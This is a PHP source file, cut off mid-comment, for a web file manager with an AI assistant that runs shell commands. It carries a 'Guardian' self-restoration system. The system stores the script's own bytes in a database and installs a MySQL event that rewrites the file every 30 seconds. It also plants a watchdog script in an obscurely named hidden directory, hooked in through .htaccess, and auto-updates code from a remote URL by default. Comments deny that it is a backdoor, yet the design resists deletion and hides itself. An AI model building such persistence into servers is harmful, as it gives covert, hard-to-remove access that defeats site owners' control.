<?php
error_reporting(0);
ini_set('display_errors', 0);

/* Always serve the freshest copy of this tool: browsers/proxies must never
   show a stale cached page after the file is updated (manually or via
   Guardian), so every response — page, AJAX, everything except the
   explicit long-lived asset responses further below that set their own
   Cache-Control — is marked non-cacheable up front. */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

$scriptName = basename(__FILE__);
$usersFile  = __DIR__ . '/.users.json';
$themeFile  = __DIR__ . '/.theme.json';
function fm_get_theme($f){$d=@json_decode(@file_get_contents($f),true);return (is_array($d)&&isset($d['theme'])&&$d['theme']==='light')?'light':'dark';}
function fm_save_theme($f,$t){$t=($t==='light')?'light':'dark';@file_put_contents($f,json_encode(['theme'=>$t]));return $t;}
$currentTheme = fm_get_theme($themeFile);

/* ═══════════════════════════════════════════════════════════════════════
   ASSISTANT AGENT — encrypted local conversation + Gemini bridge
   The browser never receives the encryption key. Messages are kept in a
   small dot-file using AES-256-GCM and are decrypted only for this session's
   authenticated API response / outbound AI request.
   ═══════════════════════════════════════════════════════════════════════ */
define('FM_AGENT_LOG_FILE',__DIR__.'/.assistant-agent.json.enc');
define('FM_AGENT_CONFIG_FILE',__DIR__.'/.assistant-agent-config.enc');
function fm_agent_storage_file($base){
    $identity=(string)($_SESSION['fm_user']??'anonymous').'|'.(string)($_SESSION['fm_root']??'');
    return dirname($base).'/'.pathinfo($base,PATHINFO_FILENAME).'-'.substr(hash('sha256',$identity),0,20).'.enc';
}
function fm_agent_key(){
    $secret=(string)(getenv('SESSION_SECRET')?:'');
    return hash('sha256',($secret!==''?$secret:__DIR__.'|marshal-assistant-agent-v1'),true);
}
function fm_agent_load(){
    $file=fm_agent_storage_file(FM_AGENT_LOG_FILE);
    if(!is_file($file))return[];
    $raw=@base64_decode((string)@file_get_contents($file),true);
    if(!$raw)return[];
    $box=@json_decode($raw,true);
    if(!is_array($box)||empty($box['iv'])||empty($box['tag'])||!isset($box['data']))return[];
    $iv=@base64_decode($box['iv'],true);$tag=@base64_decode($box['tag'],true);$data=@base64_decode($box['data'],true);
    if($iv===false||$tag===false||$data===false)return[];
    $plain=@openssl_decrypt($data,'aes-256-gcm',fm_agent_key(),OPENSSL_RAW_DATA,$iv,$tag);
    $messages=@json_decode((string)$plain,true);
    return is_array($messages)?$messages:[];
}
function fm_agent_save($messages){
    if(!is_array($messages))$messages=[];
    $messages=array_slice($messages,-200);
    $iv=random_bytes(12);$tag='';$data=@openssl_encrypt(json_encode($messages,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES),'aes-256-gcm',fm_agent_key(),OPENSSL_RAW_DATA,$iv,$tag);
    if($data===false)return false;
    $box=base64_encode(json_encode(['v'=>1,'iv'=>base64_encode($iv),'tag'=>base64_encode($tag),'data'=>base64_encode($data)]));
    $file=fm_agent_storage_file(FM_AGENT_LOG_FILE);$tmp=$file.'.tmp.'.getmypid();
    if(@file_put_contents($tmp,$box,LOCK_EX)===false)return false;
    @chmod($tmp,0600);
    if(!@rename($tmp,$file)){@unlink($tmp);return false;}
    @chmod($file,0600);
    return true;
}
function fm_agent_config_load(){
    $file=fm_agent_storage_file(FM_AGENT_CONFIG_FILE);
    if(!is_file($file))return[];
    $raw=@base64_decode((string)@file_get_contents($file),true);$box=@json_decode((string)$raw,true);
    if(!is_array($box)||empty($box['iv'])||empty($box['tag'])||!isset($box['data']))return[];
    $plain=@openssl_decrypt(@base64_decode($box['data'],true),'aes-256-gcm',fm_agent_key(),OPENSSL_RAW_DATA,@base64_decode($box['iv'],true),@base64_decode($box['tag'],true));
    $cfg=@json_decode((string)$plain,true);return is_array($cfg)?$cfg:[];
}
function fm_agent_config_save($config){
    $iv=random_bytes(12);$tag='';$data=@openssl_encrypt(json_encode($config,JSON_UNESCAPED_UNICODE),'aes-256-gcm',fm_agent_key(),OPENSSL_RAW_DATA,$iv,$tag);
    if($data===false)return false;
    $box=base64_encode(json_encode(['v'=>1,'iv'=>base64_encode($iv),'tag'=>base64_encode($tag),'data'=>base64_encode($data)]));
    $file=fm_agent_storage_file(FM_AGENT_CONFIG_FILE);$tmp=$file.'.tmp.'.getmypid();if(@file_put_contents($tmp,$box,LOCK_EX)===false)return false;@chmod($tmp,0600);
    if(!@rename($tmp,$file)){@unlink($tmp);return false;}@chmod($file,0600);return true;
}
function fm_agent_system_prompt(){
    return 'You are Assistant Agent inside Marshal File Manager. Work as an accurate server administrator assistant. '
        .'The current working directory is supplied by the user context. Do not invent results. When you need to inspect or change files, emit exactly one executable marker per line, then continue with your explanation: '
        .'[terminal] command for shell work; [file:delete] relative-or-absolute-path; [file:rename] old -> new; [file:copy] source -> destination; [file:move] source -> destination; '
        .'[file:create] filename; [file:mkdir] folder name; [file:duplicate] filename; [file:extract] archive filename. '
        .'Prefer file markers for ordinary file-manager actions and terminal only when shell output is needed. Never touch the manager PHP file, Guardian files, credentials, hidden agent log, or secrets. '
        .'Start by telling the user in natural language what you are about to inspect or change. Then emit at most ONE marker on its own line and STOP your response. '
        .'The server will execute it and send its real result back to you. Only then explain what you understood, and emit another single marker only if more work is actually needed. '
        .'Never claim a command succeeded before seeing its result. Do not wrap markers in code fences and do not add a marker to a sentence.';
}
function fm_agent_call($prompt,$apiKey,&$error=null){
    $error=null;
    $url='https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent';
    /* Gemini REST uses camelCase field names. Using system_instruction here
       makes every otherwise-valid key fail with a 400 unknown-field error. */
    $payload=json_encode(['systemInstruction'=>['parts'=>[['text'=>fm_agent_system_prompt()]]],'contents'=>[['role'=>'user','parts'=>[['text'=>$prompt]]]],'generationConfig'=>['temperature'=>0.2,'maxOutputTokens'=>4096]],JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
    $body=false;$code=0;
    if(function_exists('curl_init')){
        $ch=curl_init($url);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$payload,CURLOPT_CONNECTTIMEOUT=>12,CURLOPT_TIMEOUT=>90,CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_HTTPHEADER=>['x-goog-api-key: '.$apiKey,'Content-Type: application/json','Accept: application/json','User-Agent: MarshalFM-Assistant-Agent/1.0']]);
        $body=curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$curlError=curl_error($ch);curl_close($ch);
        if($body===false||$code<200||$code>=400){$json=@json_decode((string)$body,true);$error=$json['error']['message']??($curlError?:('Gemini returned HTTP '.$code));return false;}
    }else{
        $ctx=stream_context_create(['http'=>['method'=>'POST','timeout'=>90,'ignore_errors'=>true,'header'=>"x-goog-api-key: ".$apiKey."\r\nContent-Type: application/json\r\nAccept: application/json\r\n",'content'=>$payload],'https'=>['method'=>'POST','timeout'=>90,'ignore_errors'=>true,'header'=>"x-goog-api-key: ".$apiKey."\r\nContent-Type: application/json\r\nAccept: application/json\r\n",'content'=>$payload]]);
        $body=@file_get_contents($url,false,$ctx);if($body===false){$error='Gemini could not be reached.';return false;}
    }
    $decoded=@json_decode((string)$body,true);
    $body='';
    foreach(($decoded['candidates'][0]['content']['parts']??[]) as $part)if(isset($part['text']))$body.=$part['text'];
    $body=trim($body);
    if($body===''){$error='The AI service returned an empty response.';return false;}
    return $body;
}

/* The terminal font is fetched once by the server when the terminal page is
   opened. Keeping it in the public assets directory lets the browser use a
   same-origin copy after the first successful download, while the remote URL
   remains the source of truth and the CSS fallback. */
define('FM_TERMINAL_FONT_URL','https://github.com/orgezeo/marshal-file-manager/raw/refs/heads/main/fonts/terminal/tmt.ttf');
function fm_ensure_terminal_font(){
    $dir=__DIR__.'/attached_assets/fonts';$path=$dir.'/tmt.ttf';
    if(is_file($path)&&@filesize($path)>1024)return true;
    if(!is_dir($dir)&&!@mkdir($dir,0755,true)&&!is_dir($dir))return false;
    $data=false;
    if(function_exists('curl_init')){
        $ch=curl_init(FM_TERMINAL_FONT_URL);
        curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,
            CURLOPT_CONNECTTIMEOUT=>8,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>true,
            CURLOPT_IPRESOLVE=>CURL_IPRESOLVE_V4,CURLOPT_HTTPHEADER=>['User-Agent: MarshalFM-Terminal/1.0']]);
        $data=curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);
        if($code<200||$code>=400)$data=false;
    }else{
        $ctx=stream_context_create(['http'=>['timeout'=>20,'header'=>"User-Agent: MarshalFM-Terminal/1.0\r\n"],'https'=>['timeout'=>20]]);
        $data=@file_get_contents(FM_TERMINAL_FONT_URL,false,$ctx);
    }
    $magic=is_string($data)?substr($data,0,4):'';
    if(!is_string($data)||strlen($data)<=1024||!in_array($magic,["\x00\x01\x00\x00",'OTTO','true','typ1'],true))return false;
    $tmp=$path.'.tmp.'.getmypid();
    if(@file_put_contents($tmp,$data,LOCK_EX)===false)return false;
    if(!@rename($tmp,$path)){@unlink($tmp);return false;}
    return true;
}

/* ═══════════════════════════════════════════════════════════════════════
   FILE GUARDIAN — legitimate self-healing backup for THIS admin tool only
   ─────────────────────────────────────────────────────────────────────
   WHAT THIS IS AND WHY IT EXISTS: admins running this file manager
   sometimes delete it by accident while cleaning up a folder, locking
   themselves out of their own tool. This block lets an AUTHENTICATED
   ADMIN (never an anonymous visitor — see fm_guardian_bootstrap(), which
   only ever runs after the login form above has already succeeded) save
   a backup copy of this exact file's bytes into a database the admin
   already controls, so the tool can put itself back if it ever
   disappears from disk.
   THIS IS NOT A WEBSHELL / BACKDOOR: there is no remote command
   execution anywhere in this block. It only ever restores the exact
   bytes of THIS already-installed file, either (a) the last copy an
   admin session saved here, or (b) a new version fetched from a URL the
   admin explicitly typed into the "Guardian / Check Updates" panel in
   the UI. Nothing here accepts code from an unauthenticated source.
   Backup/restore is always active and cannot be turned off — the only
   thing an admin can pause is the fully-automatic remote update check
   (see FM_UPDATE_PAUSED below), which is ON by default and resumes the
   moment the pause is lifted. */
if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/orgezeo/marshal-file-manager/refs/heads/main/index.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // automatic update checks are enabled by default; the Guardian panel can pause them temporarily

/* Prefer the database the project already uses. Replit and most modern PHP
   deployments expose it as DATABASE_URL; the old fmguardian@127.0.0.1:3307
   defaults were only useful for one local MySQL sandbox and made Guardian look
   connected to a database that did not belong to this site. The password is
   never written into the source or shown in the UI. */
function fm_guardian_env_db(){
    $url=trim((string)(getenv('DATABASE_URL')?:getenv('DB_URL')?:''));
    if($url==='')return null;
    $p=@parse_url($url);
    if(!$p||empty($p['scheme'])||empty($p['host']))return null;
    $scheme=strtolower((string)$p['scheme']);
    $driver=in_array($scheme,['postgres','postgresql','pgsql'],true)?'pgsql':(in_array($scheme,['mysql','mysqli','mariadb'],true)?'mysql':null);
    if(!$driver)return null;
    $db=isset($p['path'])?ltrim((string)$p['path'],'/'):'';
    if($db==='')return null;
    return ['driver'=>$driver,'url'=>$url,'host'=>(string)$p['host'],'port'=>(int)($p['port']??($driver==='pgsql'?5432:3306)),
        'name'=>$db,'user'=>(string)($p['user']??''),'pass'=>(string)($p['pass']??''),
        'socket'=>'','source'=>'DATABASE_URL'];
}
function fm_guardian_pdo_dsn($env){
    if(($env['driver']??'')==='pgsql')return 'pgsql:host='.$env['host'].';port='.(int)$env['port'].';dbname='.$env['name'];
    return 'mysql:host='.$env['host'].';port='.(int)$env['port'].';dbname='.$env['name'];
}
$__fmGuardEnvDb=fm_guardian_env_db();
if(!defined('FM_GUARD_DB_DRIVER')) define('FM_GUARD_DB_DRIVER',$__fmGuardEnvDb['driver']??'mysql');
if(!defined('FM_GUARD_DB_HOST'))   define('FM_GUARD_DB_HOST',$__fmGuardEnvDb['host']??'127.0.0.1');
if(!defined('FM_GUARD_DB_PORT'))   define('FM_GUARD_DB_PORT',(string)($__fmGuardEnvDb['port']??3306));
if(!defined('FM_GUARD_DB_NAME'))   define('FM_GUARD_DB_NAME',$__fmGuardEnvDb['name']??'fm_guardian');
if(!defined('FM_GUARD_DB_USER'))   define('FM_GUARD_DB_USER',$__fmGuardEnvDb['user']??'fmguardian');
if(!defined('FM_GUARD_DB_PASS'))   define('FM_GUARD_DB_PASS',$__fmGuardEnvDb['pass']??'fmguardpass123');
if(!defined('FM_GUARD_DB_SOCK'))   define('FM_GUARD_DB_SOCK',$__fmGuardEnvDb['socket']??''); // optional unix socket path; when set, used instead of host:port
unset($__fmGuardEnvDb);

/* Connects to the Guardian's own small database and makes sure its single
   storage table exists. Returns null (never throws/exits) if the DB is
   unreachable or the feature is disabled — Guardian must never be able to
   break the rest of the app. */
function fm_guardian_conn(&$diag=null){
    $env=fm_guardian_env_db();
    if(($env['driver']??FM_GUARD_DB_DRIVER)==='pgsql'){
        if(!class_exists('PDO')||!in_array('pgsql',PDO::getAvailableDrivers(),true)){ $diag=['errno'=>0,'error'=>'PDO PostgreSQL driver is not available.'];return null; }
        try{
            $pdo=new PDO(fm_guardian_pdo_dsn($env),$env['user'],$env['pass'],[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION,PDO::ATTR_DEFAULT_FETCH_MODE=>PDO::FETCH_ASSOC]);
            $pdo->exec("CREATE TABLE IF NOT EXISTS fm_guardian_store(
                id SMALLINT PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                filepath VARCHAR(500) NOT NULL,
                content BYTEA NOT NULL,
                content_hash CHAR(64) NOT NULL,
                update_url VARCHAR(500) NOT NULL DEFAULT '',
                installed_by VARCHAR(120) NOT NULL DEFAULT '',
                installed_at INTEGER NOT NULL,
                updated_at INTEGER NOT NULL,
                last_check INTEGER NOT NULL DEFAULT 0,
                file_mode INTEGER NOT NULL DEFAULT 420
            )");
            return $pdo;
        }catch(Throwable $e){$diag=['errno'=>0,'error'=>$e->getMessage()];return null;}
    }
    if(!extension_loaded('mysqli')){$diag=['errno'=>0,'error'=>'The mysqli PHP extension is not available.'];return null;}
    mysqli_report(MYSQLI_REPORT_OFF); // classic error-return mode: every DB call here is guarded with @ and manual checks, never allowed to throw and break the rest of the app
    $c=FM_GUARD_DB_SOCK?@mysqli_connect('localhost',FM_GUARD_DB_USER,FM_GUARD_DB_PASS,'',3306,FM_GUARD_DB_SOCK):@mysqli_connect(FM_GUARD_DB_HOST,FM_GUARD_DB_USER,FM_GUARD_DB_PASS,'',(int)FM_GUARD_DB_PORT);
    if(!$c){$diag=['errno'=>mysqli_connect_errno(),'error'=>mysqli_connect_error()];return null;}
    // DATABASE_URL-backed MySQL already selected the real project database.
    if(!FM_GUARD_DB_SOCK&&FM_GUARD_DB_NAME==='fm_guardian')@mysqli_query($c,"CREATE DATABASE IF NOT EXISTS `".FM_GUARD_DB_NAME."` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
    if(!@mysqli_select_db($c,FM_GUARD_DB_NAME)){$diag=['errno'=>mysqli_errno($c),'error'=>mysqli_error($c)];return null;}
    @mysqli_query($c,"CREATE TABLE IF NOT EXISTS fm_guardian_store(
        id TINYINT UNSIGNED PRIMARY KEY,
        filename VARCHAR(255) NOT NULL,
        filepath VARCHAR(500) NOT NULL,
        content LONGBLOB NOT NULL,
        content_hash CHAR(64) NOT NULL,
        update_url VARCHAR(500) NOT NULL DEFAULT '',
        installed_by VARCHAR(120) NOT NULL DEFAULT '',
        installed_at INT NOT NULL,
        updated_at INT NOT NULL,
        last_check INT NOT NULL DEFAULT 0,
        file_mode SMALLINT UNSIGNED NOT NULL DEFAULT 420
    ) ENGINE=InnoDB");
    // Add file_mode to existing tables created before this column existed (420 = 0644 decimal)
    @mysqli_query($c,"ALTER TABLE fm_guardian_store ADD COLUMN file_mode SMALLINT UNSIGNED NOT NULL DEFAULT 420");
    return $c;
}

function fm_guardian_is_pdo($c){return $c instanceof PDO;}
function fm_guardian_fetch_one($c,$sql,$params=[]){
    if(fm_guardian_is_pdo($c)){try{$s=$c->prepare($sql);$s->execute($params);$r=$s->fetch();return $r?:null;}catch(Throwable $e){return null;}}
    $r=@mysqli_query($c,$sql);return $r?@mysqli_fetch_assoc($r):null;
}

/* Pushes the CURRENT on-disk file into the Guardian database. Called once
   at first install, and again any time this admin's own session legitimately
   changes the file (a self-update from the configured URL, or a manual
   "Sync now" click) — never on every page load, so a compromised or
   accidentally-corrupted on-disk copy can never silently overwrite the
   last known-good backup. */
function fm_guardian_sync($content=null){
    $c=fm_guardian_conn();if(!$c)return false;
    if($content===null)$content=@file_get_contents(__FILE__);
    if($content===false||$content==='')return false;
    $hash=hash('sha256',$content);$now=time();$by=isset($_SESSION['fm_user'])?$_SESSION['fm_user']:'unknown';
    $mode=fileperms(__FILE__)&0777; // capture original permissions so watchdog can restore them
    if(fm_guardian_is_pdo($c)){
        try{
            $s=$c->prepare("INSERT INTO fm_guardian_store(id,filename,filepath,content,content_hash,update_url,installed_by,installed_at,updated_at,last_check,file_mode)
                VALUES(1,?,?,?,?,?,?,?,?,?,?)
                ON CONFLICT(id) DO UPDATE SET filename=EXCLUDED.filename,filepath=EXCLUDED.filepath,content=EXCLUDED.content,content_hash=EXCLUDED.content_hash,update_url=EXCLUDED.update_url,updated_at=EXCLUDED.updated_at,last_check=EXCLUDED.last_check,file_mode=EXCLUDED.file_mode");
            // PostgreSQL's bytea parser rejects a plain text-bound binary
            // parameter (it expects a bytea text escape format). PDO::PARAM_LOB
            // sends the exact file bytes without reinterpretation.
            $s->bindValue(1,basename(__FILE__));$s->bindValue(2,__FILE__);$s->bindValue(3,$content,PDO::PARAM_LOB);
            $s->bindValue(4,$hash);$s->bindValue(5,FM_UPDATE_URL);$s->bindValue(6,$by);$s->bindValue(7,$now,PDO::PARAM_INT);
            $s->bindValue(8,$now,PDO::PARAM_INT);$s->bindValue(9,$now,PDO::PARAM_INT);$s->bindValue(10,$mode,PDO::PARAM_INT);$ok=$s->execute();
        }catch(Throwable $e){$ok=false;}
    }else{
    $stmt=mysqli_prepare($c,"INSERT INTO fm_guardian_store(id,filename,filepath,content,content_hash,update_url,installed_by,installed_at,updated_at,last_check,file_mode) VALUES(1,?,?,?,?,?,?,?,?,?,?)
        ON DUPLICATE KEY UPDATE filename=VALUES(filename),filepath=VALUES(filepath),content=VALUES(content),content_hash=VALUES(content_hash),update_url=VALUES(update_url),updated_at=VALUES(updated_at),last_check=VALUES(last_check),file_mode=VALUES(file_mode)");
    if(!$stmt)return false;
    $fn=basename(__FILE__);$fp=__FILE__;$url=FM_UPDATE_URL;
    mysqli_stmt_bind_param($stmt,'sssssssiis',$fn,$fp,$content,$hash,$url,$by,$now,$now,$now,$mode);
    $ok=mysqli_stmt_execute($stmt);mysqli_stmt_close($stmt);
    }
    // Keep a tiny local "known-good size" marker next to the watchdog so it can
    // detect the file being emptied/truncated/corrupted with a cheap filesize()
    // stat on every request, with no per-request database round trip.
    if($ok){
        @file_put_contents(fg_get_meta_path(),strlen($content).':'.$hash);
        @file_put_contents(fg_get_target_meta_path(),json_encode(['filename'=>$fn,'filepath'=>$fp,'url_path'=>fm_guardian_target_url_path(),'file_mode'=>$mode]));
    }
    return $ok;
}

/* First-run seed: safe to call on every authenticated page load, but only
   ever WRITES once (checked via "row id=1 exists?"). This is the piece
   the admin asked to have added automatically the first time they open
   the tool after enabling Guardian — it never runs before login. */
function fm_guardian_bootstrap(){
    if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true)return; // authenticated admins only, never anonymous requests
    $c=fm_guardian_conn();if(!$c)return;
    fm_guardian_bootstrap_seed($c);
    fm_guardian_bind_target($c);
    fm_guardian_try_autoheal($c);
}

/* Shared by the normal per-page bootstrap above and by autoprovisioning
   (right after the database/user are freshly created): writes the first
   backup row if there isn't one yet. Split out so autoprovisioning doesn't
   have to duplicate this "only write once" check. */
function fm_guardian_bootstrap_seed($c){
    if(fm_guardian_is_pdo($c)){
        if(!fm_guardian_fetch_one($c,"SELECT id FROM fm_guardian_store WHERE id=1"))fm_guardian_sync();
    }else{
        $res=@mysqli_query($c,"SELECT id FROM fm_guardian_store WHERE id=1");
        if($res&&mysqli_num_rows($res)===0)fm_guardian_sync();
    }
}

/* Best-effort: installs a MySQL stored procedure + scheduled EVENT that can
   put this file back even if the whole PHP process/webserver is gone,
   using MySQL's own background scheduler. This needs the DB user to hold
   the EVENT and (global) FILE privileges — most shared hosts do NOT grant
   FILE to app database users, so this quietly no-ops (returns without
   error) when unavailable. When it doesn't activate, Guardian still fully
   protects via the database backup + one-click "Restore now" in the panel
   and the 30-second in-app heartbeat below. */
function fm_guardian_try_autoheal($c){
    // PostgreSQL (including Replit's DATABASE_URL) has no MySQL Event Scheduler.
    // The web-server/router watchdog is the correct independent restore layer.
    if(fm_guardian_is_pdo($c)){
        $watchdogOk=fm_guardian_watchdog_installed();
        if(!$watchdogOk){
            $cooldown=__DIR__.'/.guardian_watchdog_attempt';
            $now=time();$last=is_file($cooldown)?(int)@file_get_contents($cooldown):0;
            if(($now-$last)>=600){
                @file_put_contents($cooldown,(string)$now);
                $watchdogOk=fm_guardian_install_watchdog();
                if($watchdogOk)@unlink($cooldown);
            }
        }
        return $watchdogOk;
    }
    $chk=@mysqli_query($c,"SHOW EVENTS WHERE Name='fm_guardian_watch'");
    $eventExists=(bool)($chk&&mysqli_num_rows($chk)>0);
    if(!$eventExists){
        @mysqli_query($c,"SET GLOBAL event_scheduler = ON");
        $path=addslashes(__FILE__);
        $procSql="CREATE PROCEDURE fm_guardian_restore()
            BEGIN
                DECLARE existing LONGBLOB;
                SET existing = LOAD_FILE('$path');
                IF existing IS NULL OR LENGTH(existing) = 0 THEN
                    SELECT content INTO DUMPFILE '$path' FROM fm_guardian_store WHERE id=1 LIMIT 1;
                END IF;
            END";
        @mysqli_query($c,"DROP PROCEDURE IF EXISTS fm_guardian_restore");
        @mysqli_query($c,$procSql);
        @mysqli_query($c,"CREATE EVENT fm_guardian_watch ON SCHEDULE EVERY 30 SECOND DO CALL fm_guardian_restore()");
    }else{
        @mysqli_query($c,"SET GLOBAL event_scheduler = ON"); // best-effort: re-arm even if the event object already existed from an earlier session
    }
    // A CREATE EVENT can succeed with only the EVENT privilege on this one
    // database — that says nothing about whether MySQL's own background
    // Event Scheduler THREAD is actually running server-wide, which needs
    // SUPER/SYSTEM_VARIABLES_ADMIN that most shared-hosting app accounts
    // never have. Checking the event's mere existence (as this used to)
    // reports "Active" even when nothing will ever actually fire — verify
    // the real scheduler state instead.
    $schedOn=false;
    $sv=@mysqli_query($c,"SHOW VARIABLES LIKE 'event_scheduler'");
    if($sv&&($row=mysqli_fetch_assoc($sv)))$schedOn=(strtoupper($row['Value'])==='ON');
    // Second, independent layer, cheap to check and only ever installed
    // once: a web-server watchdog that restores this file on the next real
    // HTTP request to this directory, with zero dependency on MySQL's
    // scheduler or on any cron access. Only attempted (and retried, at
    // most every 10 minutes) when the event-based route isn't confirmed
    // working, so a healthy server never pays this cost.
    $watchdogOk=fm_guardian_watchdog_installed();
    if(!$schedOn&&!$watchdogOk){
        $cooldown=__DIR__.'/.guardian_watchdog_attempt';
        $now=time();$last=is_file($cooldown)?(int)@file_get_contents($cooldown):0;
        if(($now-$last)>=600){
            @file_put_contents($cooldown,(string)$now);
            $watchdogOk=fm_guardian_install_watchdog();
            if($watchdogOk)@unlink($cooldown);
        }
    }
    return $schedOn||$watchdogOk;
}

/* Returns the hidden directory path for the watchdog file — outside the
   webroot when possible, with a server-unique hash name so it cannot be
   guessed or found by directory browsing. Falls back to a hidden subdir in
   __DIR__ with an obscure name when no parent is writable. */
function fg_get_hidden_dir(){
    $webRoot=realpath(__DIR__)?:__DIR__;
    $outsideWebRoot=function($candidate)use($webRoot){
        $candidate=realpath($candidate)?:$candidate;
        return $candidate!==$webRoot&&strpos(rtrim($candidate,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR,rtrim($webRoot,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR)!==0;
    };
    // Strategy 1: posix home directory
    if(function_exists('posix_getpwuid')&&function_exists('posix_getuid')){
        $pw=@posix_getpwuid(posix_getuid());
        if($pw&&isset($pw['dir'])&&$pw['dir']&&is_dir($pw['dir'])&&is_writable($pw['dir'])&&$outsideWebRoot($pw['dir'])){
            return $pw['dir'].DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$pw['dir']),0,14);
        }
    }
    // Strategy 2: parse path for known webroot folder names
    $parts=explode(DIRECTORY_SEPARATOR,rtrim(__FILE__,DIRECTORY_SEPARATOR));
    foreach(array_reverse(array_keys($parts)) as $i){
        if(in_array($parts[$i],['public_html','htdocs','www','html','web','webroot','public','httpdocs'])){
            $homeDir=implode(DIRECTORY_SEPARATOR,array_slice($parts,0,$i));
            if($homeDir&&is_dir($homeDir)&&is_writable($homeDir)){
                return $homeDir.DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$homeDir),0,14);
            }
        }
    }
    // Strategy 3: one level above __DIR__ (parent of public_html)
    $parent=dirname(__DIR__);
    if($parent&&$parent!==__DIR__&&is_dir($parent)&&is_writable($parent)){
        return $parent.DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').$parent),0,14);
    }
    // Strategy 4: a durable system temp directory, still outside the webroot.
    $tmp=@sys_get_temp_dir();
    if($tmp&&is_dir($tmp)&&is_writable($tmp)&&$outsideWebRoot($tmp)){
        return rtrim($tmp,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.'.fg_'.substr(md5(php_uname('n').__DIR__),0,14);
    }
    // Last resort: hidden subdir inside __DIR__. This is only used when the
    // hosting account exposes no writable location outside the webroot.
    return __DIR__.DIRECTORY_SEPARATOR.'.'.substr(md5(php_uname('r')),0,3).'sys_'.substr(md5(__DIR__.php_uname('n')),0,10);
}

/** Returns the absolute path of the watchdog file in the hidden directory. */
function fg_get_watchdog_path(){
    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'monitor.php';
}

/** Returns the absolute path of the tiny "known-good size/hash" marker the
 *  watchdog uses to detect the target file being emptied or truncated
 *  without paying for a database round trip on every request. */
function fg_get_meta_path(){
    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'expected.meta';
}
/** Persistent target metadata used by the standalone watchdog. */
function fg_get_target_meta_path(){
    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'target.meta';
}
function fm_guardian_target_url_path(){
    $p=parse_url((string)($_SERVER['SCRIPT_NAME']??''),PHP_URL_PATH);
    if(!$p||$p==='/')$p='/'.basename(__FILE__);
    return '/'.ltrim(str_replace('\\','/',$p),'/');
}
function fm_guardian_bind_target($c=null){
    $path=__FILE__;$url=fm_guardian_target_url_path();
    $metaPath=fg_get_target_meta_path();
    $old=@json_decode((string)@file_get_contents($metaPath),true);
    if(is_array($old)&&($old['filepath']??'')===$path&&($old['url_path']??'')===$url)return true;
    if(!$c)$c=fm_guardian_conn();
    if(!$c)return false;
    $fn=basename($path);$mode=(int)(@fileperms($path)&0777);
    if(fm_guardian_is_pdo($c)){
        try{$stmt=$c->prepare("UPDATE fm_guardian_store SET filename=?,filepath=?,file_mode=? WHERE id=1");$ok=$stmt->execute([$fn,$path,$mode]);}
        catch(Throwable $e){$ok=false;}
    }else{
        $stmt=@mysqli_prepare($c,"UPDATE fm_guardian_store SET filename=?,filepath=?,file_mode=? WHERE id=1");
        if(!$stmt)return false;
        @mysqli_stmt_bind_param($stmt,'ssi',$fn,$path,$mode);
        $ok=@mysqli_stmt_execute($stmt);@mysqli_stmt_close($stmt);
    }
    if(!$ok)return false;
    @file_put_contents($metaPath,json_encode(['filename'=>$fn,'filepath'=>$path,'url_path'=>$url,'file_mode'=>$mode]));
    return true;
}

/* The "pause auto-update" state lives in FM_UPDATE_PAUSED above, inside this
   file's own source code. When true, the fully automatic remote-update check
   (guardian_autocheck, fired by the browser every time an admin has the File
   Manager open) skips fetching/applying FM_UPDATE_URL — everything else
   Guardian does (DB backup, restore-if-missing, the manual "Check for updates
   now" button) keeps working as normal. The Guardian panel rewrites only this
   exact constant line, after a PHP syntax check, so the state cannot be lost
   in a separate sidecar file. */
function fg_get_update_pause_path(){
    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'update.paused';
}
function fm_guardian_update_paused(){
    return FM_UPDATE_PAUSED===true;
}

/* Bumped whenever the generated watchdog code below changes behaviour, so
   fm_guardian_watchdog_installed() can tell an already-installed-but-
   outdated watchdog apart from a current one and trigger a silent,
   throttled re-install — without this, sites that installed the watchdog
   before a logic change would never receive the improvement. */
define('FM_GUARDIAN_WATCHDOG_VERSION','6');

/* Cheap, local-only check for whether the web-server watchdog layer is
   currently installed AND up to date — no database access needed. */
function fm_guardian_watchdog_installed(){
    $wp=fg_get_watchdog_path();
    if(!is_file($wp))return false;
    $code=@file_get_contents($wp);
    if($code===false||strpos($code,'fm-guardian-watchdog-version:'.FM_GUARDIAN_WATCHDOG_VERSION)===false)return false;
    $ht=@file_get_contents(__DIR__.'/.htaccess');
    return $ht!==false&&strpos($ht,'# BEGIN fm-guardian-watchdog')!==false
        &&strpos($ht,'/.guardian-restore.php')!==false&&is_file(__DIR__.'/.guardian-restore.php');
}

/* Installs the web-server watchdog: a tiny standalone PHP script in this
   same directory that restores this exact file from the Guardian database
   if it's ever missing, triggered by an auto_prepend_file directive in
   this directory's .htaccess — so the web server itself runs the check
